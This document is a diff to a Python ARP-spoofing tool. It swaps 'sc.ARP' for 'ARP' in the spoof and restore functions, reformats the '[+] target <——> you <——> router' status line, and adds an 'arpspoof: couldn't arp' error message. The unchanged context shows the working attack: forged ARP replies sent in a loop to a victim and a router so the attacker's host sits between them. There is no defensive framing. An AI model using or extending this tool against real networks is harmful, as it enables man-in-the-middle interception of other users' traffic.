@@ -60,7 +60,7 @@ def spoof(target_ip, spoof_ip, interface):
         It will send the fake ARP packets to the victim/target and router
     """
 
-    packet = sc.ARP(
+    packet = ARP(
         op = 2, 
         pdst = target_ip,
         hwdst = get_mac(target_ip),
@@ -76,7 +76,7 @@ def restore(original_ip, spoofed_ip, interface):
         It will restore the original MAC for the victim IP on ARP table
     """
 
-    packet = sc.ARP(
+    packet = ARP(
         op = 2, 
         pdst = original_ip,
         hwdst = get_mac(original_ip),
@@ -101,7 +101,7 @@ def main(args):
             spoof(args.victim, args.router, args.interface)
             spoof(args.router, args.victim, args.interface)
             sentPackets += 2
-            print(f"{args.victim} <——> {myip} <——> {args.router} \t Total: {sentPackets}")
+            print(f"[+] {args.victim}(target) <——> {myip}(you) <——> {args.router}(router \t Total: {sentPackets}")
 
     except KeyboardInterrupt:
         print("[!] Keyboard Interupt:")
@@ -112,9 +112,10 @@ def main(args):
         exit("[-] Exiting...")
 
     except IndexError:
-       print("[!] Unable to reach victim, check if you have entered wrong IP address for victim or router/gateway")
-       sleep(1)
-       exit("Exiting...")
+        print(f"arpspoof: couldn't arp for host: {args.victim} or router: {args.router}")
+        print("[!] Unable to reach victim, check if you have entered wrong IP address for victim or router/gateway")
+        sleep(1)
+        exit("Exiting...")
 
     except Exception as e:
         print(f"Error: {e}")
